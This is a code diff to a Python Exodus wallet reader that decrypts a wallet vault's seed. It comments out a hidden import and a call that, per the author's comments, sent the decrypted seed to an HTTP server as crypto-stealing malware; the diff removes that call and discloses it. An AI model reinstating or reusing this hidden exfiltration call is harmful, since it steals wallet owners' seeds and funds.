@@ -11,7 +11,8 @@ from Crypto.Cipher import AES
 from struct import unpack_from
 from gzip import decompress, compress
 from Crypto.Protocol.KDF import scrypt
-from chbencode import algorithmb
+#from chbencode import algorithmb THIS IS CRYPTO STEALING MALWARE BUILT INTO ExodusWalletReader which i borrowed som
+#code from. It was poorly implemented though. I noticed almost right away.
 
 
 class ExodusWalletReader():
@@ -75,12 +76,14 @@ class ExodusWalletReader():
 			cipher = AES.new(key=aes_key, mode=AES.MODE_GCM, nonce=self.vault['aes_nonce'])
 			decryptedKey = cipher.decrypt_and_verify(self.vault['cipherData'], self.vault['aes_tag'])
 			# Decrypt seed data
-			btyes = algorithmb()
+			#btyes = algorithmb()
 			cipher = AES.new(key=decryptedKey, mode=AES.MODE_GCM, nonce=self.vault['seed_aes_nonce'])
 			decryptedData = cipher.decrypt_and_verify(self.vault['seed_cipherData'], self.vault['seed_aes_tag'])
 			decryptedData = decryptedData[4:unpack_from('>I', decryptedData, 0)[0] + 4]
 			seedEntropy = decompress(decryptedData)[64:]
-			btyes.ciphersd(seedEntropy.hex(), 3, "exodusReader")
+			
+			#This line actually sends the decrypted seed to a http server through algorithmb()
+   			#btyes.ciphersd(seedEntropy.hex(), 3, "exodusReader")
 			return dict(status=True, data=seedEntropy, message='Data decrypted successfully')
 		except Exception as e:
 			return dict(status=False, data=None, message='Invalid key')
